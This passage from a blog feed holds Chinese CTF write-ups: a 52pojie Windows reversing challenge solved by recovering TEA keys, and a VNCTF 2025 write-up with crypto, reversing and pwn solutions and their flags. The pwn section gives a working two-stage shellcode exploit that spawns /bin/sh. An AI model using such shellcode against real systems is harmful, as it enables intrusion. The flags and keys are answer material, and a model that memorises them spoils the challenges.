title="dec函数"></a>dec函数</h3><p>将unhex后数据按8字节分块进行tea的解密，tea加密的Key由上一层传入的v12通过RC4得到，且每次解密Key都会变化（固定变化），直接动调就可以拿到几次解密用到的Key值。</p><p><img src="/2025/02/18/Wuai2025Windows5/10.png" alt="alt text"></p><p>下面一系列解密就是tea的解密，不过是展开，可以数出一共是12轮，且Delta直接可以通过两次sum的值相减得到（由于tea解密这边应该是加上sum，ida伪代码展示是减，但是实际计算后数值一样），B979379E就是tea解密用到的Delta。</p><p><img src="/2025/02/18/Wuai2025Windows5/11.png" alt="alt text"></p><p>所以就可以通过动调得到的几次Key和Delta写出tea的加密代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> key1[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0xD7851B65</span>,</span><br><span class="line">    <span class="number">0x473457C1</span>,</span><br><span class="line">    <span class="number">0x1231F787</span>,</span><br><span class="line">    <span class="number">0x9ACD6D9A</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">uint32_t</span> key2[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0xB728E994</span>,</span><br><span class="line">    <span class="number">0x1746382E</span>,</span><br><span class="line">    <span class="number">0xC52D865C</span>,</span><br><span class="line">    <span class="number">0x10778A6E</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">uint32_t</span> key3[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x7459F437</span>,</span><br><span class="line">    <span class="number">0x90D1E5D</span>,</span><br><span class="line">    <span class="number">0x779375B2</span>,</span><br><span class="line">    <span class="number">0xEFCB8541</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tea_encrypt</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> k[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0xB979379E</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">        v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="主解题流程"><a href="#主解题流程" class="headerlink" title="主解题流程"></a>主解题流程</h2><p>通过用c++实现这部分代码，获取时间戳数据（8字节）。</p><p><img src="/2025/02/18/Wuai2025Windows5/12.png" alt="alt text"></p><p>然后将uid转为8字节字节数据拼接到时间戳字节后面。</p><p>MD5值暂时填充4个0x00，将MD5值和4个0x04字节拼接上。</p><p>将完整数据进行tea_encrypt，再用flag{}包裹填入编辑框进行验证。</p><p>在MD5生成代码处，断点在箭头处，即可得到MD5四字节数据。</p><p><img src="/2025/02/18/Wuai2025Windows5/13.png" alt="alt text"></p><p>最终再重复上面步骤即可得到flag。</p><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tea_encrypt</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> k[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0xB979379E</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">        v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输入格式：</span></span><br><span class="line"><span class="comment">flag</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">tea_enc</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    timestamp 8字节</span></span><br><span class="line"><span class="comment">    uid 8字节</span></span><br><span class="line"><span class="comment">    md5 4字节</span></span><br><span class="line"><span class="comment">    0x04*4 4字节填充</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 动调得到的三个Key</span></span><br><span class="line">    <span class="type">uint32_t</span> key1[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0xD7851B65</span>,</span><br><span class="line">        <span class="number">0x473457C1</span>,</span><br><span class="line">        <span class="number">0x1231F787</span>,</span><br><span class="line">        <span class="number">0x9ACD6D9A</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> key2[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0xB728E994</span>,</span><br><span class="line">        <span class="number">0x1746382E</span>,</span><br><span class="line">        <span class="number">0xC52D865C</span>,</span><br><span class="line">        <span class="number">0x10778A6E</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> key3[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x7459F437</span>,</span><br><span class="line">        <span class="number">0x90D1E5D</span>,</span><br><span class="line">        <span class="number">0x779375B2</span>,</span><br><span class="line">        <span class="number">0xEFCB8541</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> timestamp_bytes[<span class="number">8</span>]&#123;&#125;;</span><br><span class="line">    <span class="comment">// 8字节下的UID</span></span><br><span class="line">    <span class="type">uint8_t</span> uid[]&#123; <span class="number">0x50</span>, <span class="number">0x04</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span> &#125;;</span><br><span class="line">    <span class="comment">// 动调得到MD5四个字节，加上最后4个0x04填充</span></span><br><span class="line">    <span class="type">uint8_t</span> md5_and_pad[]&#123; <span class="number">0xD2</span>, <span class="number">0x63</span>, <span class="number">0xE4</span>, <span class="number">0xE6</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x04</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 半时整点时间戳计算</span></span><br><span class="line">    FILETIME time&#123;&#125;;</span><br><span class="line">    DWORD64 timestamp&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GetSystemTimeAsFileTime</span>(&amp;time);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">void</span>*)(&amp;timestamp), (<span class="type">void</span>*)(&amp;time), <span class="number">8</span>);</span><br><span class="line">    timestamp = <span class="number">1800</span> * ((timestamp / <span class="number">0x989680</span> - <span class="number">0x2B6109100LL</span>) / <span class="number">0x708</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">void</span>*)(timestamp_bytes), (<span class="type">void</span>*)(&amp;timestamp), <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加密数据</span></span><br><span class="line">    <span class="built_in">tea_encrypt</span>((<span class="type">uint32_t</span>*)timestamp_bytes, (<span class="type">uint32_t</span>*)key1);</span><br><span class="line">    <span class="built_in">tea_encrypt</span>((<span class="type">uint32_t</span>*)uid, (<span class="type">uint32_t</span>*)key2);</span><br><span class="line">    <span class="built_in">tea_encrypt</span>((<span class="type">uint32_t</span>*)md5_and_pad, (<span class="type">uint32_t</span>*)key3);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag&#123;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, timestamp_bytes[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, uid[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, md5_and_pad[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h1><p>动调调试分析程序主体流程很重要，要先了解大概执行框架才能逐步往下层分析，且上层一些代码条件有助于下层的分析。</p><p>然后踩了一个严重的坑就是IDA伪代码里面的变量值和实际值一些情况下是不一样的，之前写题没在意那么多，这次很多地方都发现有这种问题，卡了我分析好久。所以关键代码段最好用汇编逐步分析，看实际数据的变化。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;吾爱2025-Windows逆向高级题-5&quot;&gt;&lt;a href=&quot;#吾爱2025-Windows逆向高级题-5&quot; class=&quot;headerlink&quot; title=&quot;吾爱2025-Windows逆向高级题-5&quot;&gt;&lt;/a&gt;吾爱2025-Windows逆向高级题-5&lt;/</summary>
      
    
    
    
    <category term="逆向练习" scheme="https://tkazer.github.io/categories/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>VNCTF2025</title>
    <link href="https://tkazer.github.io/2025/02/12/VNCTF2025/"/>
    <id>https://tkazer.github.io/2025/02/12/VNCTF2025/</id>
    <published>2025-02-12T14:53:27.000Z</published>
    <updated>2025-02-12T15:10:39.099Z</updated>
    
    <content type="html"><![CDATA[<h1 id="VNCTF-2025-WP"><a href="#VNCTF-2025-WP" class="headerlink" title="VNCTF 2025 WP"></a>VNCTF 2025 WP</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="VN-Lang"><a href="#VN-Lang" class="headerlink" title="VN_Lang"></a>VN_Lang</h3><p>IDA分析VN_Lang_XXXX.exe字符串搜索VN得到Flag。</p><p><img src="/2025/02/12/VNCTF2025/vnlang.png" alt="vnlang"></p><h4 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{i9UQEqFXgbJBI1LasSZmBxxXSNYFRyCkpydKvhZo7d9Ai}</strong></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easymath"><a href="#easymath" class="headerlink" title="easymath"></a>easymath</h3><p>ai一把梭。</p><p>dec.sage:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> ZZ, PolynomialRing</span><br><span class="line"></span><br><span class="line">R = PolynomialRing(ZZ, <span class="string">&quot;x&quot;</span>)</span><br><span class="line">x = R.gen()</span><br><span class="line">polynomial = x**<span class="number">3</span> - <span class="number">15264966144147258587171776703005926730518438603688487721465</span>*x**<span class="number">2</span> + <span class="number">76513250180666948190254989703768338299723386154619468700730085586057638716434556720233473454400881002065319569292923</span>*x - <span class="number">125440939526343949494022113552414275560444252378483072729156599143746741258532431664938677330319449789665352104352620658550544887807433866999963624320909981994018431526620619</span></span><br><span class="line"></span><br><span class="line">roots = polynomial.roots()</span><br><span class="line">primes = [<span class="built_in">int</span>(r[<span class="number">0</span>]) <span class="keyword">for</span> r <span class="keyword">in</span> roots]</span><br><span class="line">N = primes[<span class="number">0</span>] * primes[<span class="number">1</span>] * primes[<span class="number">2</span>]</span><br><span class="line">c = <span class="number">24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span></span><br><span class="line"></span><br><span class="line">square_roots = []</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> primes:</span><br><span class="line">    root = power_mod(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p) </span><br><span class="line">    square_roots.append((root, p))</span><br><span class="line"></span><br><span class="line">possible_flags = []</span><br><span class="line"><span class="keyword">for</span> signs <span class="keyword">in</span> [(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>), (<span class="number">1</span>, <span class="number">1</span>, -<span class="number">1</span>), (<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>), (-<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>), (-<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>), (-<span class="number">1</span>, <span class="number">1</span>, -<span class="number">1</span>), (<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>), (-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>)]:</span><br><span class="line">    crt_solution = crt([signs[i] * square_roots[i][<span class="number">0</span>] % primes[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)], primes)</span><br><span class="line">    possible_flags.append(crt_solution)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(possible_flags)</span><br><span class="line"><span class="comment">#[55745449774035533604132123837354458550470434042238203561240895515463850669082841278843372190705837595737691650856096087615682512159689935652128349720357413457859444632369350, 125115225001407144448151513636019415817956856295873219712252392836948941964102523530173092625214575404136789335483571504152920024161726170211008255272440379726560839152801102, 121308689781282565030341210716083690163638176623957028113928015415750030819041672272612041957024041097790808247093717003449846352538078398824952421335589115302596759718820027, 60203414044033723113683626590079903689763905879374101193373685550258360403003508805935592269106120673140798276984048897114005911074753100616094921754147882416738708813989459, 325714524936805045870599916394859742487396082609853016904206306797799294429908134765584705104874385528562768869049154397624863645707696788955369048469602267457592373819517, 4132249745061384463680902836330585396806075754526044615228583727996710439490759392326635373295408691874543857258903655100698535269355468175011202985320866691421671807800592, 65237525482310226380338486962334371870680346499108971535782913593488380855528922859003085061213329116524553827368571761436538976732680766383868702566762099577279722712631160, 69695489752308415889889989715059817009973818336244869167915703628282890589449590386095305139613612193927660453496524570934862375647743931347835274600552568536158986894251269]</span></span><br></pre></td></tr></table></figure><p>dec.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p =[<span class="number">55745449774035533604132123837354458550470434042238203561240895515463850669082841278843372190705837595737691650856096087615682512159689935652128349720357413457859444632369350</span>, <span class="number">125115225001407144448151513636019415817956856295873219712252392836948941964102523530173092625214575404136789335483571504152920024161726170211008255272440379726560839152801102</span>, <span class="number">121308689781282565030341210716083690163638176623957028113928015415750030819041672272612041957024041097790808247093717003449846352538078398824952421335589115302596759718820027</span>, <span class="number">60203414044033723113683626590079903689763905879374101193373685550258360403003508805935592269106120673140798276984048897114005911074753100616094921754147882416738708813989459</span>, <span class="number">325714524936805045870599916394859742487396082609853016904206306797799294429908134765584705104874385528562768869049154397624863645707696788955369048469602267457592373819517</span>, <span class="number">4132249745061384463680902836330585396806075754526044615228583727996710439490759392326635373295408691874543857258903655100698535269355468175011202985320866691421671807800592</span>, <span class="number">65237525482310226380338486962334371870680346499108971535782913593488380855528922859003085061213329116524553827368571761436538976732680766383868702566762099577279722712631160</span>, <span class="number">69695489752308415889889989715059817009973818336244869167915703628282890589449590386095305139613612193927660453496524570934862375647743931347835274600552568536158986894251269</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> p:</span><br><span class="line">    f_bytes = f.to_bytes((f.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, byteorder=<span class="string">&quot;big&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> f_bytes.startswith(<span class="string">b&#x27;VNCTF&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(f_bytes.decode())</span><br><span class="line">        </span><br><span class="line"><span class="comment"># VNCTF&#123;90dcfb2dfb21a21e0c8715cbf3643f4a47d3e2e4b3f7b7975954e6d9701d9648&#125;</span></span><br></pre></td></tr></table></figure><h4 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{90dcfb2dfb21a21e0c8715cbf3643f4a47d3e2e4b3f7b7975954e6d9701d9648}</strong></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="签个到吧"><a href="#签个到吧" class="headerlink" title="签个到吧"></a>签个到吧</h3><p>checksec</p><p><img src="/2025/02/12/VNCTF2025/pwn2.png" alt="QQ_1739074297610"></p><p>IDA分析pwn程序</p><p><img src="/2025/02/12/VNCTF2025/pwn1.png" alt="QQ_1739073892530"></p><p>发现就给22字节大小，可以写一个标准最短shell，但是execute函数清空了寄存器。</p><p><img src="/2025/02/12/VNCTF2025/pwn3.png" alt="QQ_1739074388173"></p><p>所以可以通过一段shellcode再read一次更大的空间。</p><p>接下来用shellcode调用&#x2F;bin&#x2F;sh即可。</p><p>参考：<a href="https://v3rdant.cn/Pwn.The-Art-of-Shellcode/">Pwn.the-Art-of-Shellcode | V3rdant’s Blog</a></p><p>payload.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch= <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>) </span><br><span class="line"><span class="comment">#p = remote(&quot;node.vnteam.cn&quot;,...)</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xchg rdi, rsi</span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    add edx, 0x114</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;try to show your strength \n&#x27;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;0&#x27;</span>*<span class="number">13</span> + asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rsp, rsi</span></span><br><span class="line"><span class="string">    add rsp, 0x114</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    mul rsi</span></span><br><span class="line"><span class="string">    push r8</span></span><br><span class="line"><span class="string">    mov rcx, 0x68732f2f6e69622f</span></span><br><span class="line"><span class="string">    push rcx</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    mov al, 59</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(pay)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/12/VNCTF2025/pwn4.png" alt="QQ_1739075764118"></p><h4 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag"></a>Flag</h4><p><strong>动态值</strong></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Fuko’s-starfish"><a href="#Fuko’s-starfish" class="headerlink" title="Fuko’s starfish"></a><strong>Fuko’s starfish</strong></h3><p>IDA分析.exe程序发现最终游戏调用的是starfish.dll里面的函数，程序本身似乎没有与flag相关数据。</p><p><img src="/2025/02/12/VNCTF2025/fuko1.png" alt="QQ_1739075923934"></p><p>IDA分析.dll程序的play_snake函数，发现输出”u win”下面分支调用了一个Check函数（改名后的），Check函数有花指令，直接将图2红框部分nop即可F5分析。</p><p><img src="/2025/02/12/VNCTF2025/fuko2.png" alt="QQ_1739076003936"></p><p><img src="/2025/02/12/VNCTF2025/fuko7.png" alt="QQ_1739076991040"></p><p>可以看到函数内部就是主体流程，要解密一段字符串输出然后要求输入，加密最后与被加密的flag进行对比。</p><p><img src="/2025/02/12/VNCTF2025/fuko3.png" alt="QQ_1739076094303"></p><p>输入32长度字符串，被分为16字节为一个单位进行加密，进入加密函数发现有调试器检测，让数据走不同分支处理，直接将下图红框部分nop进行pass，然后将jz改成jmp即可（手动重新算一下相对偏移就行）。</p><p><img src="/2025/02/12/VNCTF2025/fuko11.png" alt="QQ_1739077386431"></p><p><img src="/2025/02/12/VNCTF2025/fuko8.png" alt="QQ_1739077338900"></p><p>可以通过算法特征识别出这是一个标准AES加密，没看出魔改的地方，但是密钥是从全局数据获取再经过一通计算拿的，计算过程不好看，考虑用动调获取，并且图1部分用密钥与输入进来的Input进行了异或，可以通过Input和这段数据进行异或获取到密钥。</p><p><img src="/2025/02/12/VNCTF2025/fuko4.png" alt="QQ_1739076342223"></p><p><img src="/2025/02/12/VNCTF2025/fuko5.png" alt="QQ_1739076365537"></p><p>看到DllMain似乎有反调试，但是似乎只扫描了进程，而且没检测ida，所以就不管了。</p><p><img src="/2025/02/12/VNCTF2025/fuko6.png" alt="QQ_1739076850485"></p><p>直接写一个程序来加载这个dll来call Check函数，便于调试。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">auto</span> hLib = <span class="built_in">LoadLibraryW</span>(<span class="string">L&quot;starfish.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (hLib)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> Addr = (DWORD64)hLib + <span class="number">0x25F0</span>;</span><br><span class="line"><span class="built_in">void</span> (*funcPtr)() = <span class="built_in">reinterpret_cast</span>&lt;<span class="built_in">void</span>(*)()&gt;(Addr);</span><br><span class="line"><span class="built_in">funcPtr</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入”1111111111111111”然后动调断点在下图断点，取出所有异或后的值，然后重新与输入字符再次异或拿到Key.</p><p><img src="/2025/02/12/VNCTF2025/fuko9.png" alt="QQ_1739077545772"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td 